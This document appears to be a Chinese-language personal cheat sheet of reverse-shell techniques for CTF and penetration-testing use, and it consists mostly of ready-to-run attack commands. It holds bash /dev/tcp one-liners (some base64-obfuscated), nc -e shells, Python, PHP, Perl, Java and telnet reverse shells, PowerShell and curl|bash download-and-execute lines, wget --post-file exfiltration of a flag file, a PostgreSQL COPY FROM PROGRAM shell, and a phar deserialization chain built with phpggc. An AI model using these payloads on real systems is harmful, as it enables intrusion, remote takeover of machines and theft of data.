[revshells](https://www.revshells.com/)
[反弹 Shell 大全与原理](https://mp.weixin.qq.com/s/ClqEAqpPxlscNJphSBfhKA)
[Ladon | 22 种反弹 Shell 方法 openssl\\java\\py\\php\\perl\\lua\\curl\\socat ncat ruby](https://mp.weixin.qq.com/s/oPFxDxaUb9eGm-zrJzP55g)


- TheFatRat 创建反弹 shell

## 反弹 Shell

https://www.cnblogs.com/xiaozi/p/13493010.html

如果是 php_shell, `?c=system('wget http://xxx')` , `wget xxx` 这里要进行 url 编码

windows 上传 `certutil -urlcache -split -f http://11.1.63.37/nc.exe nc.exe`

nc 参数

```shell
-l              listen mode, for inbound connects
-L              listen harder, re-listen on socket close
-v              verbose [use twice to be more verbose]
```

**bash 连接**

```shell
# 攻击机器
nc -lvp 7777

# 被攻击机 , 不要在zsh
/bin/bash -i >& /dev/tcp/攻击机ip/7777 0>&1
bash -c '/bin/bash -i >& /dev/tcp/192.168.50.161/7777 0>&1'
bash -c 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTAuMTYxLzc3NzcgMD4mMQ==|base64 -d|bash -i'
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTAuMTYxLzc3NzcgMD4mMQ==|base64 -d|bash
curl http://攻击机ip:2126/sa.sh|bash

## curl: shell.txt,内容为bash -i >& /dev/tcp/攻击机ip/7777 0>&1
curl 192.168.1.20|bash
nc 127.0.0.1 7777 -e /bin/bash
nc 127.0.0.1 7777 -e cmd.exe                       // Windows
nc 127.0.0.1 7777 -e c:\windows\system32\cmd.exe   // Windows

## nc连接无 -e 参数
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 1.1.1.1 7777 1>/tmp/backpipe

nc -e /bin/sh 192.168.50.161 4444
## python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.1",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
## php
php -r '$sock=fsockopen("192.168.32.1",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
### php/pcntl_exec
/?cmd=pcntl_exec("/usr/bin/python",array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("1.1.1.1",29999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));

## perl - Linux
perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
## perl - Windows
perl -e 'use Socket;$i="47.101.57.72";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## telnet , 攻击机监听2个端口 nc -lvvp 4445, nc -lvvp 4444
telnet 192.168.50.161 4444 | /bin/bash | telnet 192.168.50.161 4445
```

**powershell**

```bat
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.183.1:8080/powercat.ps1');powercat -c 192.168.183.1 -p 4444 -e cmd
```

**利用被攻击机 ip**
其他都是需要攻击机 ip，这个则相反。我的理解是需要攻击机 ip 的相当于把 shell 弹给攻击机(所以攻击机 ip 和 bash 在一行代码)，而这个相当于在本地端口开个 shell,攻击机访问端口来拿 shell

```shell
nc 1.1.1.1 7777

# 被攻击机输入
nc -lvp 7777 -e /bin/bash
```

python 方式 2

```py
#!/usr/bin/python
#-*- coding: utf-8 -*-
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.20.151",7777)) #更改localhost为自己的外网ip,端口任意
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

客户机

```
curl 192.168.1.20/shell.py|python
```

**wget** 反弹 shell

```
靶机:
wget --post-file /flag http://ip:port/
wget http://wgf4242.51vip.biz/shell.txt -O /tmp/x.php && php /tmp/x.php
wget 192.168.20.130/shell.txt -O /tmp/x.php && php /tmp/x.php
http://xxx/wget?argv=1&argv=--post-file&argv=/flag&argv=http://wgf4242.51vip.biz:34578
vps攻击机: nc -lvp 2333
```

shell.txt 内容

```php
<?php
$sock=fsockopen("1.1.1.1",7777);//localhost为自己的外网ip，端口任意
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

python -m http.server --bind 0.0.0.0 8080

**java** 反弹 shell
[Runtime 执行 linux 命令时管道符不生效](https://mp.weixin.qq.com/s/EhatzI7QVmh_RQZYOWNBYg)

```java
public class Revs {
public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

Runtime 执行 linux 命令时管道符不生效, 用 base64 编码内容

```sh
#bash
bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yLjMuNC8yMjIzIDA+JjEg}|{base64,-d}|{bash,-i}
#python
python -c exec('L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yLjMuNC8yMjIzIDA+JjEg'.decode('base64'))
```

**postgres** 反弹 shell

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '/bin/bash -i >& /dev/tcp/11.1.xx.xx/1234 0>&1';
-- COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

### less/phar 反弹 shell

原理简单来说是利用 less.php 编译 Less，在编译的过程中，利用`@import (inline)`和`data`伪协议将文件写入到`assets/forum.css`中，再用`data-uri('phar://./assets/forum.css')`触发 phar 反序列化实现命令执行

这里的反序列化链由 phpggc 生成：

- 这里反弹 shell 需要一点小技巧，我这里的打法是：在 29999 端口的 HTTP 服务里放一个 1.txt，然后在 39999 端口监听准备拿 shell

```sh
perl -e 'use Socket;$i="1.1.1.1";$p=39999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

再用 phpggc 生成

```bash
php phpggc -p tar -b Monolog/RCE6 system "curl 1.1.1.1:29999/1.txt|sh"
```

payload 如下, 在自定义 css 处写入以下 payload, 保存

```bash
@import (inline) 'data:text/css;base64,dGVzdC50eHQAAAAAAA......';
```

访问一下，phar 内容成功写入

```bash
http://39.99.150.188/assets/forum.css?v=2166f2e8
```

然后再编辑一下，用 data-uri 做 phar 反序列化触发命令执行

```css
.test {
  content: data-uri("phar://./assets/forum.css");
}
```

### 无公网 IP 反弹 shell

https://www.bilibili.com/video/BV1pq4y1U7CR

方法 1:
花生壳开 127.0.0.1 54321 端口 得到 tcp://397j302b56.zicp.vip:37932
本机 nc -lvvnp 54321
远程 /?c=system("nc wgf4242.51vip.biz 39672 -e /bin/sh");

方法 2:
花生壳开虚拟机地址 192.168.0.102 54321 得到 tcp://397j302b56.zicp.vip:37932
本机 A IP 是 192.168.0.100, 电脑 B 192.168.0.100, 虚拟机 C 属于电脑 B 是 192.168.247.128
如何让 A 与 C 互通
虚拟机 C nc -lvvnp 54321
花生壳 PC$ netsh interface portproxy add v4tov4 listenaddress=192.168.0.102 listenport=54321 connectaddress=192.168.247.128 connectport=54321

bash -i >& /dev/tcp/397j302b56.zicp.vip/22599 0>&1
